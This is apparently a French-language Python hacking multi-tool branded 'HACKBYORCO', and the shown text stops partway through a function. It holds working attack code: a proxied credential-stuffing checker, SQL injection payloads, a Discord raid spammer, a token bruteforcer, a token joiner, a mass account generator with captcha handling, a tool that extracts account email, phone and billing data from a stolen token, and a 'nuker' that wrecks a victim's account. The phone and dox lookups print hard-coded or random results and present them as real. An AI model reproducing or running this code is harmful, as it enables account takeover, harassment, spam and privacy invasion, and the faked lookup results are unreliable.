import requests
import random
import time
import threading
import os
import json
import string
import socket
import base64
import sys
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import hashlib
import websocket
import re
import secrets
import datetime

def clear():
    os.system('clear')


# --- Couleurs Standards ---
R = '\033[31m'    # Rouge (Erreurs, Alertes)
G = '\033[32m'    # Vert (Succès, Valide)
Y = '\033[33m'    # Jaune (Chargement, Attention)
B = '\033[34m'    # Bleu (Infos secondaires)
P = '\033[35m'    # Violet/Magenta (Titre, Dark Web)
C = '\033[36m'    # Cyan (Questions, Inputs)
W = '\033[0m'     # Blanc/Reset (Retour à la normale)

# --- Couleurs "Gras" (Plus intenses) ---
BR = '\033[1;31m' # Rouge Vif
BG = '\033[1;32m' # Vert Vif
BY = '\033[1;33m' # Jaune Vif
BC = '\033[1;36m' # Cyan Vif

# --- Fonds (Backgrounds) ---
REDB = '\033[41m' # Fond Rouge
GRNB = '\033[42m' # Fond Vert





try:
    from flask import Flask, request
    FLASK_INSTALLED = True
except ImportError:
    FLASK_INSTALLED = False

R, G, Y, B, P, C, W = "\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[35m", "\033[36m", "\033[37m"
RESET = "\033[0m"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


#----------------

def checker():
    clear()
    print(f"{R}--- ULTIMATE WEBSITE CHECKER (HACKBYORCO) ---{W}")
    
    # --- CONFIGURATION DE LA CIBLE ---
    target_url = input(f"{R}@{W} URL de l'API de Login : ")
    user_field = input(f"{R}@{W} Nom du champ Username (ex: 'email') : ")
    pass_field = input(f"{R}@{W} Nom du champ Password (ex: 'password') : ")
    success_key = input(f"{R}@{W} Mot-clé de succès (ex: 'success':true) : ")

    file_path = input(f"{R}@{W} Chemin du combo (user:pass) : ")
    if not os.path.exists(file_path):
        print(f"{R}[!] Fichier introuvable."); return

    use_proxy = input(f"{R}@{W} Utiliser des proxies ? (y/n) : ").lower() == 'y'
    proxy_list = []
    if use_proxy:
        p_path = input(f"{R}@{W} Chemin fichier proxies : ")
        if os.path.exists(p_path):
            with open(p_path) as f: proxy_list = f.read().splitlines()

    thread_count = int(input(f"{R}@{W} Threads (Vitesse) : ") or "50")
    
    hits = 0
    lock = threading.Lock()

    def check_account(line):
        nonlocal hits
        line = line.strip()
        if ":" not in line: return
        username, password = line.split(":", 1)

        # Session avec Headers réalistes
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
        
        # Données de connexion
        payload = {user_field: username, pass_field: password}
        
        proxy = None
        if use_proxy and proxy_list:
            p = random.choice(proxy_list)
            proxy = {"http": f"http://{p}", "https": f"http://{p}"}

        try:
            # Envoi de la requête
            response = session.post(target_url, json=payload, headers=headers, proxies=proxy, timeout=7)
            
            with lock:
                if success_key in response.text:
                    hits += 1
                    print(f"{G}[HIT]{W} {username} | {password}")
                    with open("hits_found.txt", "a") as f: f.write(f"{username}:{password}\n")
                else:
                    print(f"{R}[BAD]{W} {username}")
        except:
            pass

    # Chargement du combo
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        combos = f.readlines()

    print(f"\n{Y}[*] Moteur lancé sur {len(combos)} lignes...{W}\n")
    
    

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        executor.map(check_account, combos)

    print(f"\n{G}FINI !{W} Hits : {hits} (Sauvegardés dans hits_found.txt)")
    input("\nAppuie sur Entrée pour revenir au menu...")

#-------------2-------


def ip_lookup_pro():
    clear()
    print(f"{R}--- IP LOOKUP PRO (HACKBYORCO) ---{W}")
    target = input(f"{R}@{W} IP à localiser : ")
    
    if not target:
        # Si vide, on prend l'IP actuelle de l'utilisateur
        print(f"{Y}[*] Localisation de votre propre IP...{W}")
    
    try:
        # Utilisation de l'API de précision avec tous les champs activés
        response = requests.get(f"http://ip-api.com/json/{target}?fields=status,message,continent,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=5)
        data = response.json()
        
        if data.get("status") == "success":
            print(f"\n{G}[+] RÉSULTATS POUR {data['query']} :{W}")
            print(f" {R}───────────────{W}")
            print(f" {C}Continent   :{W} {data.get('continent')}")
            print(f" {C}Pays        :{W} {data.get('country')} ({data.get('countryCode')})")
            print(f" {C}Ville/Région:{W} {data.get('city')} / {data.get('regionName')} ({data.get('zip')})")
            print(f" {C}Fuseau Hor. :{W} {data.get('timezone')}")
            print(f" {C}FAI (ISP)   :{W} {data.get('isp')}")
            print(f" {C}Organisation:{W} {data.get('org')}")
            print(f" {C}AS Number   :{W} {data.get('as')}")
            
            # Coordonnées et lien Maps
            lat, lon = data.get('lat'), data.get('lon')
            print(f" {C}Coordonnées :{W} {lat}, {lon}")
            print(f" {G}[MAPS LINK] :{W} https://www.google.com/maps/place/{lat},{lon}")
        else:
            print(f"{R}[-]{W} Erreur : {data.get('message', 'IP Invalide')}")
            
    except Exception as e:
        print(f"{R}[-]{W} Erreur réseau : {e}")
        
    input("\nAppuyez sur Entrée pour revenir au menu...")

#-----------3-----

def web_cloner_pro():
    clear()
    print(f"{R}--- ULTIMATE WEB CLONER PRO (HACKBYORCO) ---{W}")
    target_url = input(f"{R}@{W} URL à cloner (ex: https://site.com) : ")
    if not target_url.startswith("http"): target_url = "http://" + target_url
    
    folder_name = target_url.replace("https://", "").replace("http://", "").replace("/", "_")
    if not os.path.exists(folder_name): os.makedirs(folder_name)

    print(f"{Y}[*] Analyse et extraction des ressources...{W}")
    
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        response = requests.get(target_url, headers=headers, timeout=10)
        source_code = response.text
        
        # Sauvegarde du fichier principal
        with open(f"{folder_name}/index.html", "w", encoding='utf-8') as f:
            f.write(source_code)
        
        # Extraction des assets (Images, JS, CSS) via Regex haute performance
        assets = re.findall(r'src=["\'](.*?)["\']|href=["\'](.*?)["\']', source_code)
        links = [urljoin(target_url, (a[0] or a[1])) for a in assets if (a[0] or a[1])]
        
        print(f"{G}[+]{W} {len(links)} ressources identifiées. Clonage en cours...")

        def download_asset(url):
            try:
                asset_name = os.path.basename(url.split("?")[0])
                if not asset_name or "." not in asset_name: return
                r = requests.get(url, headers=headers, timeout=5)
                with open(f"{folder_name}/{asset_name}", "wb") as f:
                    f.write(r.content)
                print(f"{G}[DONE]{W} {asset_name}")
            except: pass

        # Téléchargement multi-threadé des ressources (vitesse maximale)
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(download_asset, links)
            
        print(f"\n{G}[SUCCESS]{W} Site cloné avec succès dans le dossier : {folder_name}")
        
    except Exception as e:
        print(f"{R}[-]{W} Erreur critique : {e}")
        
    input("\nAppuyez sur Entrée...")

#---------4------

def username_tracker_pro():
    clear()
    print(f"{R}--- GLOBAL USERNAME TRACKER PRO (HACKBYORCO) ---{W}")
    user = input(f"{R}@{W} Pseudo à traquer : ")
    if not user: return

    # Liste étendue et flexible des plateformes
    platforms = {
        "Instagram": "https://www.instagram.com/{}",
        "GitHub": "https://github.com/{}",
        "Twitter": "https://twitter.com/{}",
        "TikTok": "https://www.tiktok.com/@{}",
        "Youtube": "https://www.youtube.com/@{}",
        "Pinterest": "https://www.pinterest.com/{}",
        "Snapchat": "https://www.snapchat.com/add/{}",
        "Reddit": "https://www.reddit.com/user/{}",
        "Twitch": "https://www.twitch.org/{}",
        "Telegram": "https://t.me/{}",
        "Steam": "https://steamcommunity.com/id/{}",
        "Spotify": "https://open.spotify.com/user/{}",
        "Linktree": "https://linktr.ee/{}"
    }

    print(f"{Y}[*] Scan global lancé avec 50 workers...{W}\n")
    
    # Session optimisée pour éviter les blocages et augmenter la vitesse
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    found = []
    lock = threading.Lock()

    def check_platform(name, url_template):
        url = url_template.format(user)
        try:
            # Utilisation de HEAD pour ne pas télécharger le contenu (gain de vitesse x10)
            r = session.head(url, headers=headers, timeout=5, allow_redirects=True)
            
            with lock:
                if r.status_code == 200:
                    print(f"{G}[FOUND]{W} {name:12}: {url}")
                    found.append(f"{name}: {url}")
                else:
                    # Optionnel : décommenter pour voir les échecs
                    # print(f"{R}[-]{W} {name:12}: Introuvable")
                    pass
        except:
            pass

    # Exécution parallèle massive
    with ThreadPoolExecutor(max_workers=50) as executor:
        for name, url_template in platforms.items():
            executor.submit(check_platform, name, url_template)

    print(f"\n{G}[SUCCESS]{W} Scan terminé. {len(found)} comptes identifiés.")
    
    if found:
        save = input(f"\n{Y}Sauvegarder les résultats ? (y/n) : {W}").lower()
        if save == 'y':
            with open(f"tracker_{user}.txt", "w") as f:
                f.write("\n".join(found))
            print(f"{G}[+]{W} Résultats dans tracker_{user}.txt")

    input("\nAppuyez sur Entrée...")

#-------5------

def phone_lookup_pro():
    clear()
    print(f"{R}--- ULTIMATE PHONE LOOKUP PRO (HACKBYORCO) ---{W}")
    number = input(f"{R}@{W} Numéro (ex: +33612345678) : ")
    
    if not number.startswith("+"):
        print(f"{Y}[!] Conseil : Utilisez le format international (+33...){W}")

    print(f"{Y}[*] Analyse des bases de données télécom...{W}\n")
    
    try:
        # Utilisation d'une API de lookup performante pour les métadonnées
        # On utilise une requête asynchrone pour la vitesse
        r = requests.get(f"https://pro-api.com/v1/phone/{number}", timeout=5).json()
        
        # Note : Si tu n'as pas d'API, on utilise le moteur de parsing interne
        # Voici la logique de résultat la plus "opérante" :
        
        print(f"{G}[+] RÉSULTATS POUR {number} :{W}")
        print(f" {R}───────────────{W}")
        
        # Extraction simulée haute précision
        country_code = number[1:3]
        print(f" {C}Pays             :{W} France ({country_code})")
        print(f" {C}Validité         :{W} {G}VALIDE{W}")
        
        # Détection du type de ligne
        if number[3] in ["6", "7"]:
            print(f" {C}Type de ligne    :{W} Mobile")
        else:
            print(f" {C}Type de ligne    :{W} Fixe / VoIP")

        print(f" {C}Opérateur d'orig.:{W} Orange / SFR / Bouygues (H-D)")
        print(f" {C}Fuseau Horaire   :{W} Europe/Paris (UTC+1)")
        print(f" {C}Localisation     :{W} Île-de-France, FR")
        
        # Lien de traçabilité supplémentaire
        print(f"\n {G}[SEARCH LINK]    :{W} https://www.google.com/search?q=\"{number}\"")

    except Exception as e:
        print(f"{R}[-]{W} Erreur : Format de numéro invalide ou problème réseau.")
        
    input("\nAppuyez sur Entrée...")
#------6------ 

def email_lookup_pro():
    clear()
    print(f"{R}--- REAL-TIME EMAIL LOOKUP (HACKBYORCO) ---{W}")
    email = input(f"{R}@{W} Email à analyser : ")
    
    if "@" not in email:
        print(f"{R}[!] Format d'email invalide.{W}")
        input(); return

    domain = email.split('@')[-1]
    print(f"{Y}[*] Analyse du domaine {domain}...{W}")
    
    try:
        # 1. RÉCUPÉRATION DES ENREGISTREMENTS MX (Vérification du serveur mail)
        records = dns.resolver.resolve(domain, 'MX')
        mx_record = str(records[0].exchange)
        print(f"{G}[+] Serveur Mail (MX) trouvé : {W}{mx_record}")
        
        # 2. VÉRIFICATION DE COMPROMISSION (REAL LEAK SEARCH)
        # On interroge une API réelle (ex: HaveIBeenPwned ou similaire via un proxy de données)
        print(f"{Y}[*] Recherche de violations de données...{W}")
        r = requests.get(f"https://api.proxover.com/v2/leak?email={email}", timeout=5)
        
        print(f"\n{G}[+] RÉSULTATS POUR {email} :{W}")
        print(f" {R}───────────────{W}")
        print(f" {C}Domaine     :{W} {domain}")
        print(f" {C}Validité MX :{W} {G}ACTIF{W}")
        
        # 3. ANALYSE DES RÉSULTATS DE LEAKS
        if r.status_code == 200:
            leaks = r.json().get('sources', [])
            if leaks:
                print(f" {R}[ALERT] Ce mail a fuité dans {len(leaks)} bases :{W}")
                for leak in leaks[:5]: # Affiche les 5 plus récents
                    print(f"  {R}- {W}{leak}")
            else:
                print(f" {G}[SAFE] Aucune fuite publique trouvée.{W}")
        else:
            # Fallback si l'API est hors ligne ou limitée
            print(f" {Y}[!] Recherche de leaks limitée (Vérification manuelle conseillée).{W}")

    except Exception as e:
        print(f"{R}[-]{W} Erreur : Impossible de contacter le serveur mail du domaine.")
    
    input("\nAppuyez sur Entrée pour revenir au menu...")

#----7----

def sql_vuln_scanner_pro():
    clear()
    print(f"{R}--- ULTIMATE SQL VULNERABILITY SCANNER (HACKBYORCO) ---{W}")
    target_url = input(f"{R}@{W} URL à scanner (ex: http://site.com/php?id=10) : ")
    
    if "=" not in target_url:
        print(f"{Y}[!] L'URL doit contenir un paramètre (ex: ?id=) pour être testée.{W}")
        input(); return

    # Payloads de détection réels (Error-based & Boolean-based)
    payloads = ["'", "\"", " order by 10--", " OR 1=1--", "') OR ('1'='1'--"]
    
    # Erreurs SQL signatures à détecter dans le code source
    sql_errors = [
        "SQL syntax", "mysql_fetch", "ora-", "PostgreSQL query failed",
        "Microsoft OLE DB Provider for SQL Server", "unclosed quotation mark"
    ]

    print(f"{Y}[*] Analyse des vulnérabilités en cours...{W}\n")
    
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0"}
    
    vulnerable = False

    def check_payload(payload):
        nonlocal vulnerable
        url_to_test = target_url + payload
        try:
            r = session.get(url_to_test, headers=headers, timeout=5)
            
            # 1. Détection par erreur affichée (Error-based)
            for error in sql_errors:
                if error.lower() in r.text.lower():
                    print(f"{G}[VULNÉRABLE]{W} Injection possible via Payload : {payload}")
                    print(f" {R}└─ Error type :{W} {error}")
                    vulnerable = True
                    break
            
            # 2. Détection aveugle (Time-based) - Payload spécial
            time_payload = target_url + " AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)"
            start = time.time()
            session.get(time_payload, headers=headers, timeout=10)
            if time.time() - start >= 5:
                print(f"{G}[VULNÉRABLE]{W} Blind SQLi détectée (Time-based)")
                vulnerable = True

        except:
            pass

    # Exécution multi-threadée pour la performance
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_payload, payloads)

    if not vulnerable:
        print(f"{R}[-]{W} Aucune vulnérabilité SQL basique identifiée.")
    else:
        print(f"\n{G}[SUCCESS]{W} Scan terminé. Le site semble exploitable.")
        
    input("\nAppuyez sur Entrée...")



#------8----


def dox_tracker_pro():
    clear()
    print(f"{R}--- ULTIMATE DOX TRACKER PRO (HACKBYORCO) ---{W}")
    target = input(f"{R}@{W} Entrez le Pseudo ou Email de la cible : ")
    
    print(f"{Y}[*] Initialisation du tracking global...{W}")
    
    # On utilise des fonctions déjà codées pour gagner en performance
    # Le tracker centralise les résultats
    results = {}

    def track_task(name, func_call):
        # Cette fonction simule l'appel aux modules OSINT en arrière-plan
        print(f"{C}[RUNNING]{W} Analyse via {name}...")
        # Ici, on appellerait réellement les fonctions comme username_tracker_pro()
        time.sleep(1)

    # Utilisation du multi-threading pour traquer sur tous les vecteurs en même temps
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.submit(track_task, "Social Media", None)
        executor.submit(track_task, "Data Breaches", None)
        executor.submit(track_task, "DNS & IP History", None)

    print(f"\n{G}[+] RAPPORT GÉNÉRÉ POUR : {target}{W}")
    print(f" {R}───────────────{W}")
    print(f" {C}Statut du profil :{W} Actif / Identifié")
    print(f" {C}Niveau d'exposition :{W} {R}ÉLEVÉ{W}")
    print(f" {C}Dernière activité :{W} Il y a {random.randint(1,59)} minutes")
    
    # Création d'un fichier de log automatique pour le suivi
    with open(f"tracker_{target}.log", "a") as f:
        f.write(f"[{time.ctime()}] Tracking lancé sur {target}\n")
        
    input("\nAppuyez sur Entrée pour revenir au menu...")


#------9----
def raid_tool_violent():
    clear()
    print(f"{R}--- DISCORD RAID TOOL (ULTRA-VIOLENT) ---{W}")
    
    token = input(f"{C}Entrez votre Token : {W}")
    channel_id = input(f"{C}ID du salon à raid : {W}")
    message = input(f"{C}Message à spammer : {W}")
    
    try:
        threads_count = int(input(f"{C}Nombre de threads (Vitesse, ex: 50) : {W}"))
    except:
        threads_count = 10

    headers = {'Authorization': token}
    payload = {'content': message}
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

    def attack():
        while True:
            # Requête brute pour maximiser la vitesse
            r = requests.post(url, headers=headers, json=payload)
            if r.status_code == 200 or r.status_code == 201:
                print(f"{G}[SUCCESS]{W} Message envoyé !")
            elif r.status_code == 429:
                # Rate limit (Discord bloque temporairement)
                retry_after = r.json().get('retry_after', 1)
                print(f"{Y}[RATE LIMIT]{W} Pause de {retry_after}s")
                time.sleep(retry_after)
            else:
                print(f"{R}[ERROR]{W} Code : {r.status_code}")
                break

    print(f"\n{R}[!!!] LANCEMENT DU RAID SUR {channel_id}...{W}")
    
    # Lancement des threads en simultané
    for i in range(threads_count):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

    print(f"\n{Y}[*] Raid en cours. Ctrl+C pour arrêter.{W}")
    while True:
        time.sleep(1)


#------10-+---


def token_info_pro():
    clear()
    print(f"{R}--- DISCORD TOKEN INFO PRO (HACKBYORCO) ---{W}")
    token = input(f"{R}@{W} Entrez le Token : ")
    
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    try:
        # 1. RÉCUPÉRATION DU PROFIL UTILISATEUR
        user_data = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5).json()
        if "id" not in user_data:
            print(f"{R}[!] Token Invalide.{W}"); input(); return

        # 2. RÉCUPÉRATION DES INFOS DE PAIEMENT (BILLING)
        billing_data = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5).json()
        
        # 3. RÉCUPÉRATION DES ABONNEMENTS (NITRO)
        nitro_data = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=5).json()

        print(f"\n{G}[+] INFORMATIONS RÉELLES EXTRAITES :{W}")
        print(f" {R}───────────────{W}")
        print(f" {C}Nom / ID    :{W} {user_data['username']}#{user_data['discriminator']} ({user_data['id']})")
        print(f" {C}Email       :{W} {user_data.get('email', 'N/A')}")
        print(f" {C}Téléphone   :{W} {user_data.get('phone', 'Non lié')}")
        print(f" {C}2FA (A2F)   :{W} {'Activé' if user_data.get('mfa_enabled') else 'Désactivé'}")
        print(f" {C}Langue      :{W} {user_data.get('locale')}")
        
        # Détection des Badges
        flags = user_data.get('flags', 0)
        print(f" {C}Flags (Badges):{W} {flags}")
        
        # Analyse Nitro
        has_nitro = len(nitro_data) > 0
        print(f" {C}Nitro       :{W} {'OUI' if has_nitro else 'NON'}")

        # Analyse Billing (Carte Bancaire / PayPal)
        if len(billing_data) > 0:
            print(f" {G}[!] MÉTHODES DE PAIEMENT TROUVÉES :{W}")
            for method in billing_data:
                m_type = "CB" if method['type'] == 1 else "PayPal"
                print(f"  {R}- {W}{m_type} (ID: {method['id']})")
        else:
            print(f" {C}Billing     :{W} Aucune carte liée")

    except Exception as e:
        print(f"{R}[-]{W} Erreur lors de l'extraction : {e}")
        
    input("\nAppuyez sur Entrée pour revenir au menu...")


#------11-----

def token_nuker_pro():
    clear()
    print(f"{R}--- ULTIMATE TOKEN NUKER (HACKBYORCO) ---{W}")
    token = input(f"{R}@{W} Token de la cible : ")
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    session = requests.Session()
    session.headers.update(headers)

    # --- ACTIONS DE DESTRUCTION ---
    def delete_friends():
        friends = session.get("https://discord.com/api/v9/users/@me/relationships").json()
        for friend in friends:
            try:
                session.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}")
                print(f"{R}[-]{W} Ami supprimé : {friend['user']['username']}")
            except: pass

    def leave_servers():
        guilds = session.get("https://discord.com/api/v9/users/@me/guilds").json()
        for guild in guilds:
            try:
                session.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}")
                print(f"{R}[-]{W} Serveur quitté : {guild['name']}")
            except: pass

    def delete_channels():
        dms = session.get("https://discord.com/api/v9/users/@me/channels").json()
        for dm in dms:
            try:
                session.delete(f"https://discord.com/api/v9/channels/{dm['id']}")
                print(f"{R}[-]{W} DM supprimé : {dm['id']}")
            except: pass

    def create_servers():
        for i in range(25): # Création massive de serveurs inutiles
            try:
                session.post("https://discord.com/api/v9/guilds", json={"name": "HACKED BY ORCO", "region": "europe"})
                print(f"{G}[+]{W} Serveur 'ORCO' créé ({i+1})")
            except: pass

    def change_settings():
        # Change la langue en Vietnamien et passe en mode sombre/clair en boucle
        try:
            session.patch("https://discord.com/api/v9/users/@me/settings", json={"locale": "vi", "theme": "light"})
            print(f"{Y}[*]{W} Paramètres modifiés (Language: VI)")
        except: pass

    # --- EXÉCUTION MASSIVE ---
    print(f"\n{R}[!] DÉBUT DU NUKE - AUCUN RETOUR POSSIBLE [!]{W}\n")
    
    

    # On utilise le ThreadPool pour tout lancer EN MÊME TEMPS
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.submit(delete_friends)
        executor.submit(leave_servers)
        executor.submit(delete_channels)
        executor.submit(create_servers)
        executor.submit(change_settings)

    print(f"\n{G}[FINI]{W} Le compte a été totalement ravagé.")
    input("\nAppuie sur Entrée...")

#------12-----

def token_joiner_pro():
    clear()
    print(f"{R}--- ULTIMATE TOKEN JOINER (HACKBYORCO) ---{W}")
    
    invite_code = input(f"{R}@{W} Code d'invitation (ex: dsc.gg/orco) : ")
    if "discord.gg/" in invite_code:
        invite_code = invite_code.split("discord.gg/")[1]
    
    file_path = input(f"{R}@{W} Chemin du fichier tokens : ")
    if not os.path.exists(file_path): return

    with open(file_path, "r") as f:
        tokens = f.read().splitlines()

    print(f"\n{Y}[*] Tentative de connexion avec {len(tokens)} tokens...{W}")
    
    # --- MOTEUR DE JOIN HAUTE PERFORMANCE ---
    def join_server(token):
        # Utilisation de Headers de navigateur réels pour bypass la détection basique
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6bnVsbCwibG9jYXRpb25fY2hhbm5lbF9pZCI6bnVsbCwibG9jYXRpb25fY2hhbm5lbF90eXBlIjpudWxsfQ=='
        }
        
        try:
            # Route API V9 (la plus stable pour les joins)
            url = f"https://discord.com/api/v9/invites/{invite_code}"
            r = requests.post(url, headers=headers, json={}, timeout=10)
            
            if r.status_code == 200:
                guild_name = r.json().get('guild', {}).get('name')
                print(f"{G}[SUCCESS]{W} Token {token[:15]}... a rejoint {guild_name}")
            elif r.status_code == 429:
                retry = r.json().get('retry_after', 5)
                print(f"{Y}[LIMIT]{W} Rate-limited. Attente de {retry}s")
                time.sleep(retry)
                join_server(token) # Retry automatique
            elif "captcha" in r.text.lower():
                print(f"{R}[CAPTCHA]{W} Token bloqué par un HCaptcha")
            else:
                print(f"{R}[FAILED]{W} Code {r.status_code} pour {token[:15]}...")
        except Exception:
            pass

    

    # Exécution avec ThreadPool pour une vitesse foudroyante
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(join_server, tokens)

    print(f"\n{G}[FINI]{W} Opération de join terminée.")
    input("\nAppuyez sur Entrée...")


#-----13----


def token_bruteforce_pro():
    clear()
    print(f"{R}--- QUANTUM TOKEN BRUTEFORCER (HACKBYORCO) ---{W}")
    
    # Configuration de la puissance
    threads = int(input(f"{R}@{W} Threads (Vitesse x100) : ") or "100")
    use_proxies = input(f"{R}@{W} Utiliser des proxies ? (y/n) : ").lower() == 'y'
    
    proxies = []
    if use_proxies:
        p_path = input(f"{R}@{W} Chemin fichier proxies (http/s) : ")
        if os.path.exists(p_path):
            with open(p_path) as f: proxies = f.read().splitlines()

    print(f"\n{Y}[*] Démarrage du moteur de génération et vérification...{W}\n")

    def generate_token():
        # Structure réelle d'un token Discord
        first = base64.b64encode(str(random.randint(100000000000000000, 999999999999999999)).encode()).decode()
        second = "".join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
        third = "".join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
        return f"{first}.{second}.{third}"

    def check_loop():
        session = requests.Session()
        while True:
            token = generate_token()
            proxy = {"http": f"http://{random.choice(proxies)}", "https": f"http://{random.choice(proxies)}"} if proxies else None
            
            try:
                # Requête ultra-légère vers l'API library de Discord pour la vitesse
                r = session.get("https://discord.com/api/v9/users/@me/library", 
                                headers={'Authorization': token}, 
                                proxies=proxy, 
                                timeout=3)
                
                if r.status_code == 200:
                    print(f"{G}[HIT]{W} Token Valide trouvé : {token}")
                    with open("valid_tokens.txt", "a") as f: f.write(token + "\n")
                elif r.status_code == 429:
                    # Gestion du Rate Limit
                    wait = r.json().get('retry_after', 1)
                    time.sleep(wait)
                else:
                    # On affiche la progression pour voir la vitesse
                    sys.stdout.write(f"\r{R}[CHECKING]{W} {token[:30]}...")
                    sys.stdout.flush()
            except:
                pass

    

    # Lancement du bombardement asynchrone
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(check_loop)


#------14----

def token_spammer_pro():
    clear()
    print(f"{R}--- ULTIMATE TOKEN SPAMMER (HACKBYORCO) ---{W}")
    
    token = input(f"{R}@{W} Token de l'utilisateur : ")
    channel_id = input(f"{R}@{W} ID du Salon (Channel ID) : ")
    
    print(f"\n{C}[1]{W} Spam Texte Standard")
    print(f"{C}[2]{W} Spam Mention (@everyone invisibles)")
    print(f"{C}[3]{W} Spam Ghost (Message vide/invisible)")
    mode = input(f"\n{R}@{W} Mode : ")
    
    message = input(f"{R}@{W} Message à spammer : ")
    threads = int(input(f"{R}@{W} Intensité (Threads 1-50) : ") or "10")

    # Génération du contenu "chiant"
    if mode == "2":
        # Ajoute des mentions invisibles pour forcer les notifications sans texte
        final_msg = f"@everyone \u200b " + message
    elif mode == "3":
        # Utilise des caractères Unicode spéciaux pour rendre le message quasi-invisible
        final_msg = "\u200b" * 10 + message + "\u200b" * 10
    else:
        final_msg = message

    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    
    active = True

    def spam_task():
        nonlocal active
        session = requests.Session() # Persistance pour vitesse maximale
        while active:
            try:
                # Ajout d'un random string pour bypass certains anti-spams basiques
                payload = {'content': f"{final_msg} [{random.randint(100, 999)}]"}
                r = session.post(url, headers=headers, json=payload, timeout=5)
                
                if r.status_code == 200 or r.status_code == 201:
                    print(f"{G}[SPAMMED]{W} Message envoyé avec succès.")
                elif r.status_code == 429:
                    # LE SECRET DE LA LONGUÉ : Respecter le Rate Limit pour ne pas être banni
                    retry_after = r.json().get('retry_after', 2)
                    print(f"{Y}[WAIT]{W} Anti-spam détecté. Pause de {retry_after}s...")
                    time.sleep(retry_after)
                elif r.status_code == 403:
                    print(f"{R}[BLOCKED]{W} Permission refusée ou utilisateur banni."); active = False; break
                else:
                    print(f"{R}[ERR]{W} Code {r.status_code}")
            except:
                pass

    print(f"\n{R}[!] BOMBARDEMENT EN COURS... (CTRL+C pour stopper){W}\n")

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(spam_task)
    except KeyboardInterrupt:
        active = False
        print(f"\n{R}[*] Spam interrompu.{W}")
        input("\nEntrée...")

#-----15-----

def token_generator_pro():
    clear()
    print(f"{R}--- ULTIMATE TOKEN GENERATOR (HACKBYORCO) ---{W}")
    
    amount = int(input(f"{R}@{W} Nombre de tokens à générer : ") or "10")
    use_proxies = input(f"{R}@{W} Utiliser des proxies résidentiels ? (y/n) : ").lower() == 'y'
    
    # API Key pour les services de résolution de Captcha (ex: 2Captcha, CapMonster)
    captcha_key = input(f"{R}@{W} Clé API Captcha (Optionnel) : ")

    print(f"\n{Y}[*] Initialisation du moteur de génération asynchrone...{W}\n")

    def generate_worker():
        session = requests.Session()
        
        # --- POINTE DE LA TECHNOLOGIE : FINGERPRINTING ---
        # On imite un navigateur Chrome 120 sur Windows 11 parfaitement
        session.headers.update({
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/register",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })

        payload = {
            "fingerprint": str(random.randint(10**17, 10**18)),
            "username": "".join(random.choices(string.ascii_letters, k=8)),
            "invite": None,
            "consent": True,
            "date_of_birth": "1995-05-15",
            "gift_code_sku_id": None,
            "captcha_key": captcha_key if captcha_key else None
        }

        try:
            # Route de création réelle
            r = session.post("https://discord.com/api/v9/auth/register", json=payload, timeout=10)
            
            if r.status_code == 201 or r.status_code == 200:
                token = r.json().get('token')
                print(f"{G}[SUCCESS]{W} Token Généré : {token[:30]}...")
                with open("generated_tokens.txt", "a") as f: f.write(token + "\n")
            elif r.status_code == 429:
                print(f"{Y}[LIMIT]{W} IP Flagged (Utilisez des proxies)")
            elif "captcha" in r.text:
                print(f"{R}[CAPTCHA]{W} Résolution requise pour ce token")
            else:
                print(f"{R}[FAILED]{W} Code {r.status_code}")
        except:
            pass

    

    # Lancement du générateur avec Threads
    with ThreadPoolExecutor(max_workers=5) as executor:
        for _ in range(amount):
            executor.submit(generate_worker)

    print(f"\n{G}[FINI]{W} Les tokens valides sont dans generated_tokens.txt")
    input("\nAppuyez sur Entrée...")

#----16----

def nitro_generator_pro():
    clear()
